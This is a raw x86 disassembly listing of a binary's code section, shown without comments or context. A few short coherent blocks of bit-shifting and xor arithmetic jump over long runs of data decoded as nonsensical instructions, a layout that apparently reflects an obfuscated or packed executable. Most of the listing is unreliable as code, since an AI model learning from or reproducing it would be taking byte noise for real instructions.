  406d34:	jno    0x406cef
  406d36:	retf   0x45f0
  406d39:	jmp    0xc10434ab
  406d3e:	cmp    al,0x1e
  406d40:	fadd   st(1),st
  406d42:	loope  0x406d62
  406d44:	mov    ecx,DWORD PTR [ebp-0x14]
  406d47:	xor    edx,edx
  406d49:	or     eax,edx
  406d4b:	mov    cl,BYTE PTR [eax+ecx*1]
  406d4e:	mov    eax,DWORD PTR [ebp-0x34]
  406d51:	add    BYTE PTR [eax],cl
  406d53:	mov    eax,DWORD PTR [ebp-0x60]
  406d56:	mov    ecx,DWORD PTR [ebp-0x5c]
  406d59:	shrd   eax,ecx,0x2
  406d5d:	shr    ecx,0x2
  406d60:	mov    ecx,DWORD PTR [ebp-0x60]
  406d63:	mov    edx,DWORD PTR [ebp-0x5c]
  406d66:	xor    eax,edi
  406d68:	xor    edx,edx
  406d6a:	or     eax,edx
  406d6c:	lea    eax,[ebp+eax*1-0x4]
  406d70:	mov    DWORD PTR [ebp-0x34],eax
  406d73:	mov    eax,DWORD PTR [ebp-0x60]
  406d76:	shl    ecx,0x1e
  406d79:	mov    ecx,DWORD PTR [ebp-0x5c]
  406d7c:	shrd   eax,ecx,0x2
  406d80:	shr    ecx,0x2
  406d83:	mov    ecx,DWORD PTR [ebp-0x60]
  406d86:	mov    edx,DWORD PTR [ebp-0x5c]
  406d89:	xor    eax,edi
  406d8b:	xor    edx,edx
  406d8d:	or     eax,edx
  406d8f:	mov    edx,DWORD PTR [ebp+0x14]
  406d92:	shl    ecx,0x1e
  406d95:	mov    ecx,DWORD PTR [ebp-0x14]
  406d98:	mov    cl,BYTE PTR [eax+ecx*1]
  406d9b:	mov    eax,DWORD PTR [ebp-0x34]
  406d9e:	or     BYTE PTR [eax],cl
  406da0:	mov    eax,DWORD PTR [ebp+0x10]
  406da3:	jmp    0x407181
  406da8:	fcmovnb st,st(6)
  406daa:	int3   
  406dab:	xchg   edi,eax
  406dac:	lods   al,BYTE PTR ds:[esi]
  406dad:	jnp    0x406dc9
  406daf:	sbb    cl,BYTE PTR [edi+0x126a0603]
  406db5:	add    dh,BYTE PTR [ecx+0x188b0ab0]
  406dbb:	sbb    BYTE PTR [esi-0x27e7e7ee],bl
  406dc1:	mov    ah,0x6c
  406dc3:	xor    DWORD PTR [ebp+0x4d],ebx
  406dc6:	enter  0xa1ff,0xc7
  406dca:	(bad)  
  406dcc:	jge    0x406dd4
  406dce:	scas   eax,DWORD PTR es:[edi]
  406dcf:	pop    edi
  406dd0:	or     bl,ch
  406dd2:	rol    DWORD PTR [ecx+0x3c],cl
  406dd5:	add    eax,0x126ee70f
  406dda:	cmp    al,0x42
  406ddc:	enter  0x6b2,0x24
  406de0:	mov    ebx,0x762d9c40
  406de5:	dec    ecx
  406de6:	out    0xb8,eax
  406de8:	cmp    eax,ebp
  406dea:	outs   dx,DWORD PTR ds:[esi]
  406deb:	frstor [edx]
  406ded:	jae    0x406e5f
  406def:	sub    bh,dl
  406df1:	retf   
  406df2:	shl    DWORD PTR [edx+0x50],cl
  406df5:	pop    edx
  406df6:	test   BYTE PTR [ebp-0x7f],0x2
  406dfa:	xlat   BYTE PTR ds:[ebx]
  406dfb:	xlat   BYTE PTR cs:[ebx]
  406dfd:	test   eax,0x8674d861
  406e02:	shr    ecx,0x4b
  406e05:	jle    0x406e18
  406e07:	pop    es
  406e08:	sub    esp,esp
  406e0a:	addr16 mov edx,0xfbb20c2e
  406e10:	and    al,0x7e
  406e12:	test   eax,0x6abd2e88
  406e17:	xchg   esp,eax
  406e18:	pop    ebx
  406e19:	das    
  406e1a:	jno    0x406e0a
  406e1c:	push   eax
  406e1d:	pop    edx
  406e1e:	repnz inc edx
  406e20:	popf   
  406e21:	in     eax,0xe6
  406e23:	cmp    DWORD PTR [esi-0x3],ebx
  406e26:	nop
  406e27:	pop    esi
  406e28:	add    edi,edi
  406e2a:	fdiv   DWORD PTR ds:0xf914aecd
  406e30:	push   edx
  406e31:	in     eax,dx
  406e32:	mov    edx,0x24b6b90c
  406e37:	retf   
  406e38:	loop   0x406dd4
  406e3a:	sub    DWORD PTR [edi],0xa6459b19
  406e40:	dec    ebp
  406e41:	adc    dl,BYTE PTR [ebp-0x59]
  406e44:	dec    ebp
  406e45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e46:	(bad)  
  406e47:	inc    ebp
  406e48:	nop
  406e49:	jl     0x406e33
  406e4b:	mov    ?,WORD PTR ds:0xa1e3ff43
  406e51:	push   ss
  406e52:	or     esp,esi
  406e54:	(bad)  
  406e55:	jmp    0x386d:0x8e90690
  406e5c:	(bad)  
  406e5d:	sub    eax,0xc4380048
  406e62:	rol    DWORD PTR [edx+0x19ae6e5a],0x56
  406e69:	enter  0x445,0xc4
  406e6d:	cmp    al,0x79
  406e6f:	shl    BYTE PTR [esi],0x5c
  406e72:	jmp    0xd8d8:0x7abb0c7f
  406e79:	pop    esi
  406e7a:	pop    es
  406e7b:	inc    esi
  406e7c:	out    0xbf,al
  406e7e:	and    al,0xc5
  406e80:	bound  ebx,QWORD PTR [ebx+0x5c]
  406e83:	popf   
  406e84:	nop
  406e85:	ret    0xa532
  406e88:	loope  0x406e69
  406e8a:	addr16 int 0x8
  406e8d:	fbld   TBYTE PTR [ecx+0x1506679]
  406e93:	outs   dx,BYTE PTR ds:[esi]
  406e94:	mov    esp,0x826ec3aa
  406e99:	das    
  406e9a:	jmp    0x406ed5
  406e9c:	jle    0x406e4e
  406e9e:	popa   
  406e9f:	imul   edi,esp,0x22ccdfd8
  406ea5:	imul   eax,esp,0xabf64087
  406eab:	cmp    edx,DWORD PTR ds:0x1a3f71e8
  406eb1:	repnz fld QWORD PTR [ebx+eax*4-0x47]
  406eb6:	les    edx,FWORD PTR [edx+0x7f]
  406eb9:	mov    ecx,es
  406ebb:	sub    al,0xfa
  406ebd:	hlt    
  406ebe:	retf   0xdd11
  406ec1:	xchg   BYTE PTR [edi-0x53868c25],ah
  406ec7:	out    0x48,al
  406ec9:	cwde   
  406eca:	mov    WORD PTR [ecx-0x6e1230b2],?
  406ed0:	mov    ah,0x3e
  406ed2:	popf   
  406ed3:	sbb    ebp,DWORD PTR [eax+ecx*8]
  406ed6:	cmp    ch,bh
  406ed8:	push   ecx
  406ed9:	aad    0xdf
  406edb:	in     al,dx
  406edc:	outs   dx,DWORD PTR ds:[esi]
  406edd:	add    eax,0xc74ec0e2
  406ee2:	and    esp,DWORD PTR [eax+0x21]
  406ee5:	clc    
  406ee6:	stc    
  406ee7:	mov    bl,0x8e
  406ee9:	xchg   edi,ebx
  406eeb:	or     ch,BYTE PTR [edx-0x2b]
  406eee:	or     bl,ch
  406ef0:	popa   
  406ef1:	and    ch,BYTE PTR ds:0x17c16c15
  406ef7:	(bad)  
  406ef8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ef9:	jae    0x406f23
  406efb:	cmp    eax,0x147b06f9
  406f00:	pop    es
  406f01:	pushf  
  406f02:	mov    al,ds:0x44c03916
  406f07:	adc    ebp,ecx
  406f09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f0a:	push   ebx
  406f0b:	scas   al,BYTE PTR es:[edi]
  406f0c:	inc    edi
  406f0d:	pop    ebx
  406f0e:	fsub   DWORD PTR [ecx-0x5f]
  406f11:	mov    ebp,0xb28c7f86
  406f16:	push   ebx
  406f17:	and    DWORD PTR [edi+0x496ec7de],ebp
  406f1d:	push   ds
  406f1e:	jnp    0x406eb8
  406f20:	dec    esi
  406f21:	push   ds
  406f22:	fild   WORD PTR [edx]
  406f24:	jg     0x406f4e
  406f26:	popa   
  406f27:	jb     0x406f51
  406f29:	out    dx,al
  406f2a:	imul   edi,esp,0x71
  406f2d:	js     0x406f27
  406f2f:	jp     0x406f6d
  406f31:	stos   DWORD PTR es:[edi],eax
  406f32:	mov    ds:0x50391737,al
  406f37:	jnp    0x406f4d
  406f39:	add    bl,bh
  406f3b:	fist   DWORD PTR [ebx+0x6611fe81]
  406f41:	inc    edi
  406f42:	pop    esp
  406f43:	sbb    esp,DWORD PTR [edx+0x5889a611]
  406f49:	imul   esp,DWORD PTR [esi],0xffffffed
  406f4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f4d:	jo     0x406f24
  406f4f:	pop    esi
  406f50:	pop    esi
  406f51:	jne    0x406fcc
  406f53:	mov    ds:0xef4c4f63,eax
  406f58:	sub    BYTE PTR [edi+0x41],bl
  406f5b:	cdq    
  406f5c:	jle    0x406f10
  406f5e:	test   al,0x30
  406f60:	or     BYTE PTR [ebp+0x22],dh
  406f63:	test   al,0xfa
  406f65:	es jl  0x406fdf
  406f68:	add    eax,0x42df25b0
  406f6d:	inc    ebp
  406f6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f6f:	jbe    0x406f0c
  406f71:	adc    al,0xff
  406f73:	jmp    DWORD PTR [edx+eax*1]
  406f76:	cli    
  406f77:	jne    0x406f73
  406f79:	inc    edx
  406f7a:	cmp    ch,BYTE PTR [edi]
  406f7c:	mov    dh,0xe8
  406f7e:	and    al,0x30
  406f80:	es jmp 0x1ce7:0xb1468201
  406f88:	fisub  DWORD PTR [bp+si+0x67]
  406f8c:	xchg   ebx,eax
  406f8d:	repnz scas eax,DWORD PTR es:[edi]
  406f8f:	jne    0x406f7e
  406f91:	cwde   
  406f92:	jecxz  0x406f7e
  406f94:	inc    ebx
  406f95:	jle    0x406f33
  406f97:	repnz cmc 
  406f99:	repz mov ebx,0x44af63e0
  406f9f:	mov    DWORD PTR [ebp+0x5ad7d71c],ecx
  406fa5:	cmp    edi,DWORD PTR [esp+edi*1]
  406fa8:	xchg   edi,eax
  406fa9:	in     eax,dx
  406faa:	stos   BYTE PTR es:[edi],al
  406fab:	ret    
  406fac:	dec    edx
  406fad:	jb     0x406f3e
  406faf:	fistp  WORD PTR [ebx+esi*8+0x12810a5e]
  406fb6:	sbb    BYTE PTR [ecx-0x16],ch
  406fb9:	mov    gs,WORD PTR [edi+0xc]
  406fbc:	(bad)  
  406fbd:	fs or  eax,0x2e3a5284
  406fc3:	or     eax,0x87348758
  406fc8:	mov    edx,0xcc520b6a
  406fcd:	(bad)  
  406fce:	cmp    BYTE PTR [esi],ah
  406fd0:	mov    esp,0x673f87c
  406fd5:	and    eax,0x6c5dbd2f
  406fda:	inc    esp
  406fdb:	pop    esi
  406fdc:	sbb    DWORD PTR [edx-0x5195d05b],edx
  406fe2:	dec    ebx
  406fe3:	jmp    0x195d714a
  406fe8:	mov    esp,0xb6571172
  406fed:	cli    
  406fee:	push   ebp
  406fef:	int    0xbe
  406ff1:	into   
  406ff2:	xchg   esi,eax
  406ff3:	push   esp
  406ff4:	fbld   TBYTE PTR [esi+0xd2960e5]
  406ffa:	fst    DWORD PTR [esi]
  406ffc:	shr    esi,0xe9
  406fff:	pop    ebx
  407000:	mov    DWORD PTR [esi+eiz*8-0x121ba2fc],edx
  407007:	mov    cl,0x99
  407009:	push   ss
  40700a:	pop    edx
  40700b:	retf   
  40700c:	retf   0x26eb
  40700f:	mov    BYTE PTR [edx+ecx*1],dh
  407012:	mov    eax,0xcf903b00
  407017:	or     eax,0x4cbc5d72
  40701c:	sbb    edx,edi
  40701e:	into   
  40701f:	sub    BYTE PTR [edx],dh
  407021:	shl    BYTE PTR [esi+edi*1-0x72],cl
  407025:	fisttp WORD PTR [esi]
  407027:	push   edi
  407028:	xchg   dx,ax
  40702b:	sbb    esi,esp
  40702d:	add    ebp,0xffffffe4
  407030:	out    0x3d,al
  407032:	pop    esi
  407033:	(bad)  
  407034:	or     al,0xa0
  407036:	call   0xbf13:0x1818f61a
  40703d:	pop    esp
  40703e:	sbb    esp,edx
  407040:	loopne 0x40704b
  407042:	ret    
  407043:	jbe    0x40702f
  407045:	jne    0x406fe9
  407047:	pop    esp
  407048:	mov    al,0x39
  40704a:	pushf  
  40704b:	repnz fsubr DWORD PTR [edx-0x22ac1dc7]
  407052:	pushf  
  407053:	addr16 into 
  407055:	jo     0x407071
  407057:	aaa    
  407058:	(bad)  
  407059:	test   DWORD PTR [edx-0xeb9b138],esp
  40705f:	jae    0x407052
  407061:	ins    DWORD PTR es:[edi],dx
  407062:	aaa    
  407063:	jno    0x407090
  407065:	int3   
  407066:	stos   BYTE PTR es:[edi],al
  407067:	xchg   edi,eax
  407068:	aam    0xa7
  40706a:	mov    eax,ds:0xc4d3aad7
  40706f:	pop    esp
  407070:	stos   BYTE PTR es:[edi],al
  407071:	pop    esp
  407072:	and    DWORD PTR [eax+0x43],edi
  407075:	jns    0x40708a
  407077:	or     eax,0x4c6b654d
  40707c:	push   cs
  40707d:	test   al,0xb1
  40707f:	jb     0x407098
  407081:	aam    0x82
  407083:	mov    al,ds:0xe4d14d37
  407088:	inc    ecx
  407089:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40708a:	jmp    0x4070a7
  40708c:	adc    ebx,esi
  40708e:	add    al,0x86
  407090:	add    DWORD PTR [eax+0x54],esp
  407093:	mov    BYTE PTR [ebx],bl
  407095:	adc    edi,ecx
  407097:	mov    ebp,0xd6be42ef
  40709c:	sti    
  40709d:	push   0x29
  40709f:	cmp    al,0x5d
  4070a1:	lds    edi,FWORD PTR [eax+0x50]
  4070a4:	aaa    
  4070a5:	test   esi,esp
  4070a7:	(bad)  
  4070a8:	(bad)  
  4070a9:	cld    
  4070aa:	push   esi
  4070ab:	dec    esi
  4070ac:	pop    edx
  4070ad:	push   esp
  4070ae:	mov    dh,0x8b
  4070b0:	mov    ch,0x35
  4070b2:	test   al,0xc2
  4070b4:	pop    ebx
  4070b5:	stos   DWORD PTR es:[edi],eax
  4070b6:	or     al,0xeb
  4070b8:	or     BYTE PTR [ebp+edi*1+0x73],ch
  4070bc:	mov    dh,0x26
  4070be:	mov    bh,0x65
  4070c0:	inc    ebx
  4070c1:	cmp    eax,0xc6a8f6ec
  4070c6:	gs mov bh,0xf1
  4070c9:	retf   0x90e
  4070cc:	jp     0x407064
  4070ce:	xchg   edx,eax
  4070cf:	inc    ebp
  4070d0:	cld    
  4070d1:	dec    esi
  4070d2:	jo     0x4070e1
  4070d4:	jge    0x4070a2
  4070d6:	mov    ds:0x1ecb90dc,eax
  4070db:	pop    ds
  4070dc:	test   DWORD PTR [eax-0x6a],0xbbe1882f
  4070e3:	mov    eax,ds:0xc3b1d1e1
  4070e8:	(bad)  
  4070e9:	push   eax
  4070ea:	push   edi
  4070eb:	mov    eax,ds:0x9548537f
  4070f0:	jle    0x4070e3
  4070f2:	fstp   TBYTE PTR [ebx+edi*1-0x13e2be9b]
  4070f9:	sub    eax,0x9e34ea58
  4070fe:	pusha  
  4070ff:	jo     0x407170
  407101:	xchg   BYTE PTR [eax],ch
  407103:	clc    
  407104:	into   
  407105:	enter  0x33c,0x49
  407109:	call   0xa432:0x8dfb964f
  407110:	push   cs
  407111:	cmc    
  407112:	mov    DWORD PTR ds:0xb810563d,0x93747761
  40711c:	adc    dh,BYTE PTR [ebx-0x394402bb]
  407122:	rol    ecx,cl
  407124:	dec    ebx
  407125:	sbb    DWORD PTR [ebp+0x6cb6c06],0xffffffc1
  40712c:	pop    eax
  40712d:	xlat   BYTE PTR ds:[ebx]
  40712e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40712f:	inc    esp
  407130:	pop    esi
  407131:	fist   DWORD PTR [ebx-0x8]
  407134:	dec    ecx
  407135:	mov    BYTE PTR [ebx-0x5],dl
  407138:	shl    DWORD PTR [edi],cl
  40713a:	mov    cl,0x94
  40713c:	lods   al,BYTE PTR ds:[esi]
  40713d:	jnp    0x4070d4
  40713f:	sub    al,0x6
  407141:	xchg   edx,eax
  407142:	pop    ebp
  407143:	dec    ecx
  407144:	mov    esi,0xd36875fb
  407149:	mov    dh,0x8a
  40714b:	mov    dl,0x73
  40714d:	leave  
  40714e:	out    0xf2,al
  407150:	add    bl,bl
  407152:	jp     0x407106
  407154:	call   0xfd2a3067
  407159:	jno    0x40710d
  40715b:	add    DWORD PTR [edi],ebp
  40715d:	mov    dl,BYTE PTR [edi+0x5e]
  407160:	mov    al,0xe
  407162:	out    0xee,al
  407164:	mov    ecx,0x930e92e6
  407169:	dec    DWORD PTR [esi]
  40716b:	mov    ds:0x634433c7,al
  407170:	addr16 inc eax
  407172:	xor    al,0x3f
  407174:	pusha  
  407175:	and    al,0xe
  407177:	fist   DWORD PTR [eax+0x4c2da35e]
  40717d:	cmp    bh,BYTE PTR [ecx-0x37744cfd]
  407183:	shrd   ecx,edx,0x2
  407187:	shl    eax,0x1e
  40718a:	shr    edx,0x2
  40718d:	mov    DWORD PTR [ebp+0x14],edx
  407190:	mov    DWORD PTR [ebp+0x14],eax
  407193:	xor    edx,edx
  407195:	mov    eax,ecx
  407197:	xor    eax,edi
  407199:	or     eax,edx
  40719b:	mov    edx,DWORD PTR [ebp-0x4]
  40719e:	dec    eax
  40719f:	not    eax
  4071a1:	and    eax,edx
  4071a3:	xor    ecx,edi
  4071a5:	mov    DWORD PTR [ebp-0x4],eax
  4071a8:	mov    DWORD PTR [ebp+0x14],ecx
  4071ab:	xor    eax,eax
  4071ad:	or     DWORD PTR [ebp+0x14],eax
  4071b0:	mov    eax,DWORD PTR [ebp-0x50]
  4071b3:	jmp    0x407591
  4071b8:	fiadd  DWORD PTR [ecx-0x1d]
  4071bb:	mov    ah,BYTE PTR [edx]
  4071bd:	sub    bl,BYTE PTR [edx+0x21]
  4071c0:	jnp    0x407190
  4071c2:	mov    ch,0x7c
  4071c4:	loopne 0x4071a4
  4071c6:	dec    ecx
  4071c7:	push   0xffffff90
  4071c9:	test   DWORD PTR [eax],ebx
  4071cb:	sbb    BYTE PTR [esi+0x5e181812],bl
  4071d1:	dec    eax
  4071d2:	shl    BYTE PTR [esi],1
  4071d4:	das    
  4071d5:	gs pop ds
  4071d7:	sbb    DWORD PTR fs:[eax+0x1c],edx
  4071db:	inc    ecx
  4071dc:	arpl   WORD PTR [edi+eax*4-0x67],sp
  4071e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071e1:	fstp   QWORD PTR [edx-0x6c]
  4071e4:	std    
  4071e5:	jl     0x4071e2
  4071e7:	test   al,0xf4
  4071e9:	rcr    BYTE PTR [edi-0x4132e790],0x38
  4071f0:	ret    0xbc58
  4071f3:	cld    
  4071f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071f5:	jb     0x40717d
  4071f7:	xchg   esp,eax
  4071f8:	or     ebp,ebp
  4071fa:	retf   0xee0d
  4071fd:	stc    
  4071fe:	adc    edx,DWORD PTR [ecx]
  407200:	ja     0x40719d
  407202:	jle    0x407219
  407204:	mov    ecx,0x6d22aed8
  407209:	mov    edi,0xe4dc7729
  40720e:	xor    bl,BYTE PTR [esi-0x71]
  407211:	xlat   BYTE PTR ds:[ebx]
  407212:	pop    eax
  407213:	popf   
  407214:	mov    bl,cl
  407216:	adc    DWORD PTR [edx],eax
  407218:	rcl    cl,1
  40721a:	add    ebp,DWORD PTR [edx+0x6573bca]
  407220:	jbe    0x4072a1
  407222:	push   esi
  407223:	pop    ss
  407224:	xlat   BYTE PTR ds:[ebx]
  407225:	loopne 0x407204
  407227:	mov    bl,0xec
  407229:	push   cs
  40722a:	je     0x407259
  40722c:	leave  
  40722d:	lahf   
  40722e:	push   ds
  40722f:	int    0x36
  407231:	add    BYTE PTR [ecx-0x6235ecda],dl
  407237:	ins    BYTE PTR es:[edi],dx
  407238:	inc    esi
  407239:	das    
  40723a:	xor    dh,BYTE PTR [esi-0x2b]
  40723d:	ja     0x407237
  40723f:	daa    
  407240:	xor    eax,0x5876604
  407245:	inc    esi
  407246:	push   0xffffffcb
  407248:	and    ebp,DWORD PTR [ebp+ecx*1+0x5cada0b9]
  40724f:	lahf   
  407250:	call   0xf805e8c0
  407255:	rol    DWORD PTR [edi-0xca41165],cl
  40725b:	mov    ah,0x25
  40725d:	xor    eax,0x9eed7354
  407262:	imul   esp,DWORD PTR ds:0x5a056b5c,0xffffffa4
  407269:	shl    dh,0xb2
  40726c:	fisttp DWORD PTR [eax]
  40726e:	popa   
  40726f:	fsub   QWORD PTR [edi]
  407271:	adc    cl,0xef
  407274:	or     eax,0x90e21550
  407279:	jmp    0x407281
  40727b:	addr16 mov ch,0x2e
  40727e:	hlt    
  40727f:	(bad)  
  407280:	(bad)  
  407281:	out    dx,eax
  407282:	xchg   ebp,eax
  407283:	popf   
  407284:	test   edi,ecx
  407286:	iret   
  407287:	retf   
  407288:	adc    DWORD PTR [eax+edx*2-0x38],ebx
  40728c:	pop    eax
  40728d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40728e:	mov    edx,0xed5c4952
  407293:	out    0x89,al
  407295:	xchg   BYTE PTR [eax+edi*4-0x19],cl
  407299:	dec    edi
  40729a:	inc    esp
  40729b:	daa    
  40729c:	fisubr DWORD PTR [ebx]
  40729e:	rol    esp,cl
  4072a0:	dec    esp
  4072a1:	cld    
  4072a2:	lahf   
  4072a3:	mov    ds:0xa5326b16,eax
  4072a8:	sbb    ch,bh
  4072aa:	mul    edi
  4072ac:	sbb    esp,DWORD PTR [edi-0x13]
  4072af:	in     al,dx
  4072b0:	jp     0x4072ef
  4072b2:	jge    0x407310
  4072b4:	and    al,0x36
  4072b6:	fimul  WORD PTR [ecx-0x64c15cfd]
  4072bc:	xor    BYTE PTR [edi],al
  4072be:	jne    0x4072f7
  4072c0:	les    esp,FWORD PTR [esi]
  4072c2:	js     0x4072b1
  4072c4:	in     eax,dx
  4072c5:	pop    ss
  4072c6:	adc    edi,eax
  4072c8:	jne    0x4072e4
  4072ca:	xor    DWORD PTR [eax-0x69953493],edx
  4072d0:	inc    edi
  4072d1:	inc    esp
  4072d2:	retf   0xa5d5
  4072d5:	sbb    esi,DWORD PTR [ebx]
  4072d7:	fwait
  4072d8:	mov    eax,ds:0x69fdcdfd
  4072dd:	and    dh,BYTE PTR [ebp+0x5d]
  4072e0:	inc    edi
  4072e1:	hlt    
  4072e2:	popa   
  4072e3:	shl    BYTE PTR [eax+0x61],1
  4072e6:	sbb    ecx,esi
  4072e8:	push   es
  4072e9:	sar    DWORD PTR [eax],0xb9
  4072ec:	das    
  4072ed:	test   eax,0x290275fa
  4072f2:	jnp    0x407285
  4072f4:	test   al,0x9b
  4072f6:	pop    es
  4072f7:	mov    esi,0xae23fe1c
  4072fc:	adc    eax,DWORD PTR [edi+0x7819b04a]
  407302:	sar    BYTE PTR [ebx+0x11],0xdb
  407306:	mov    BYTE PTR [ebx+0x3862c464],ah
  40730c:	push   edi
  40730d:	ss es jb 0x407364
  407311:	(bad)  
  407312:	jbe    0x4072e1
  407314:	popf   
  407315:	xchg   BYTE PTR [edi+0x60324231],dh
  40731b:	or     eax,0x4109428a
  407320:	pmullw mm4,QWORD PTR [eax-0x4a52555d]
  407327:	pop    edi
  407328:	inc    ecx
  407329:	loop   0x407368
  40732b:	mov    DWORD PTR [esi-0x73],0x577d7f8b
  407332:	mov    bh,0xea
  407334:	movlps xmm0,QWORD PTR [ebx+0x6cab8a87]
  40733b:	add    DWORD PTR [esi],edx
  40733d:	imul   esi,DWORD PTR [ecx+ecx*2-0x6227b51a],0xcd450de8
  407348:	add    bl,BYTE PTR [ecx-0x50]
  40734b:	jmp    0x1a75:0x1d1707be
  407352:	ins    DWORD PTR es:[edi],dx
  407353:	sub    DWORD PTR [ebx+ecx*4-0x206921ec],0x3688f8cf
  40735e:	jbe    0x40738c
  407360:	clc    
  407361:	jns    0x407348
  407363:	add    dl,ah
  407365:	cli    
  407366:	test   al,0x89
  407368:	push   ss
  407369:	ins    WORD PTR es:[edi],dx
  40736b:	xor    edi,esp
  40736d:	jecxz  0x40732c
  40736f:	fimul  DWORD PTR [edx]
  407371:	stc    
  407372:	repnz xchg edx,eax
  407374:	int3   
  407375:	and    DWORD PTR [ebx+eiz*8],0x123b38dd
  40737c:	or     al,0x63
  40737e:	pop    esi
  40737f:	ins    DWORD PTR es:[edi],dx
  407380:	jae    0x40738c
  407382:	ds adc eax,0x43507910
  407388:	repnz repnz cmc 
  40738b:	scas   eax,DWORD PTR es:[edi]
  40738c:	sahf   
  40738d:	mov    ah,0x87
  40738f:	xchg   ecx,eax
  407390:	mov    dl,0xec
  407392:	push   ebx
  407393:	icebp  
  407394:	ret    0xa79
  407397:	push   ds
  407398:	mov    ch,0x31
  40739a:	cmp    DWORD PTR [ebx-0x33],edx
  40739d:	jae    0x4073c9
  40739f:	jp     0x40741c
  4073a1:	mov    al,ds:0xe908f8c5
  4073a6:	or     esi,DWORD PTR [ebp+0x47]
  4073a9:	mov    bl,0xc6
  4073ab:	rol    DWORD PTR es:[ecx+0x7c],0x7d
  4073b0:	inc    esp
  4073b1:	stc    
  4073b2:	cdq    
  4073b3:	frstor [eax+ebx*4]
  4073b6:	gs je  0x4073ec
  4073b9:	pop    es
  4073ba:	add    esp,eax
  4073bc:	jnp    0x4073ac
  4073be:	popa   
  4073bf:	jge    0x4073f1
  4073c1:	cwde   
  4073c2:	add    eax,0xec96dbf0
  4073c7:	add    al,0x90
  4073c9:	fcomp  st(3)
  4073cb:	xchg   edi,eax
  4073cc:	lods   eax,DWORD PTR ds:[esi]
  4073cd:	ja     0x407353
  4073cf:	inc    ecx
  4073d0:	(bad)  
  4073d2:	jb     0x4073b5
  4073d4:	pop    ebp
  4073d5:	fadd   DWORD PTR [ebx]
  4073d7:	jns    0x407434
  4073d9:	(bad)  
  4073da:	push   edi
  4073db:	jo     0x4073c7
  4073dd:	mov    ebx,0x5c41c994
  4073e2:	imul   ecx,DWORD PTR [ecx+0x1d72f3f4],0xb
  4073e9:	push   esp
  4073ea:	jl     0x407418
  4073ec:	dec    edx
  4073ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073ee:	mov    bl,0x40
  4073f0:	lds    ebx,FWORD PTR [ebp+0x6ef8d9e4]
  4073f6:	ins    BYTE PTR es:[edi],dx
  4073f7:	adc    bh,BYTE PTR [edx-0x4e2678c4]
  4073fd:	(bad)
  407400:	mov    esi,0x3d7aaf7e
  407405:	inc    ebp
  407406:	mov    esp,DWORD PTR [ebx+edi*1]
  407409:	imul   DWORD PTR [ebx+0x407739bf]
  40740f:	and    DWORD PTR [ebp+0x13],esi
  407412:	lahf   
  407413:	and    BYTE PTR [edi],ch
  407415:	sub    bl,cl
  407417:	std    
  407418:	rol    BYTE PTR [esi],1
  40741a:	jb     0x4073eb
  40741c:	pop    ds
  40741d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40741e:	cdq    
  40741f:	(bad)  
  407420:	sahf   
  407421:	int3   
  407422:	mov    ds:0xd9ea5949,eax
  407427:	cld    
  407428:	cli    
  407429:	icebp  
  40742a:	stos   DWORD PTR es:[edi],eax
  40742b:	add    DWORD PTR [esi],ebx
  40742d:	int    0x72
  40742f:	cmc    
  407430:	call   0x6cd718cc
  407435:	lea    esi,[esi+0x78]
  407438:	and    eax,0x83f94113
  40743d:	dec    ebp
  40743e:	bound  esi,QWORD PTR [esi+0x5128f51b]
  407444:	mov    ecx,0x2d49838a
  407449:	imul   esp,DWORD PTR [edi+edx*1],0xffffff94
  40744d:	mov    ebx,0xc84f9ed0
  407452:	sub    ebp,DWORD PTR [eax+0x4f]
  407455:	in     eax,0x82
  407457:	and    DWORD PTR [edi-0x1d5c13ad],esp
  40745d:	xor    esp,DWORD PTR [edx-0x15f4eae3]
  407463:	push   ebx
  407464:	and    esp,DWORD PTR [ebx]
  407466:	fwait
  407467:	cmp    eax,0xc7f08a84
  40746d:	imul   ebp,esi,0xffffffea
  407470:	outs   dx,DWORD PTR ds:[esi]
  407471:	lahf   
  407472:	dec    esp
  407473:	dec    ecx
  407474:	mov    dh,0x33
  407476:	loop   0x4074e2
  407478:	clc    
  407479:	fimul  DWORD PTR [esi+0x684749ca]
  40747f:	outs   dx,BYTE PTR ds:[esi]
  407480:	xchg   ecx,eax
  407481:	dec    edx
  407482:	and    BYTE PTR [edx+esi*2-0x4d],bh
  407486:	jbe    0x4074d8
  407488:	shl    BYTE PTR [ecx],cl
  40748a:	cwde   
  40748b:	push   edi
  40748c:	fld    TBYTE PTR [ecx]
  40748e:	test   BYTE PTR [ebx+0x7c92940d],bl
  407494:	mov    ch,dl
  407496:	mov    esi,0xbd5ec482
  40749b:	scas   eax,DWORD PTR es:[edi]
  40749c:	cwde   
  40749d:	mov    eax,ds:0x2a112adf
  4074a2:	ss mov dh,0xa5
  4074a5:	jbe    0x4074a6
  4074a7:	jle    0x4074d6
  4074a9:	repnz mov edi,0xd7cc9658
  4074af:	in     eax,dx
  4074b0:	outs   dx,DWORD PTR ds:[esi]
  4074b1:	ror    DWORD PTR [edx],0x5d
  4074b4:	push   ss
  4074b5:	int    0xcc
  4074b7:	aad    0x72
  4074b9:	out    0xa8,eax
  4074bb:	test   BYTE PTR [ebx],al
  4074bd:	xchg   esp,eax
  4074be:	js     0x4074dd
  4074c0:	jle    0x407504
  4074c2:	pop    ebx
  4074c3:	popa   
  4074c4:	pop    ebp
  4074c5:	(bad)  
  4074c6:	nop
  4074c7:	test   BYTE PTR [esi-0x1e],0x27
  4074cb:	sbb    DWORD PTR [edx],eax
  4074cd:	imul   ebx,DWORD PTR [edx+0x23],0xae220a2a
  4074d4:	or     edi,DWORD PTR [ebx+ecx*4+0x5e]
  4074d8:	xor    al,0x47
  4074da:	dec    ebp
  4074db:	int3   
  4074dc:	ja     0x40749e
  4074de:	retf   0xc238
  4074e1:	imul   esi,DWORD PTR [esi+ecx*4+0x50],0x784fdca4
  4074e9:	mov    ds:0xf0b68843,eax
  4074ee:	test   DWORD PTR [esi+ecx*4-0x21],esp
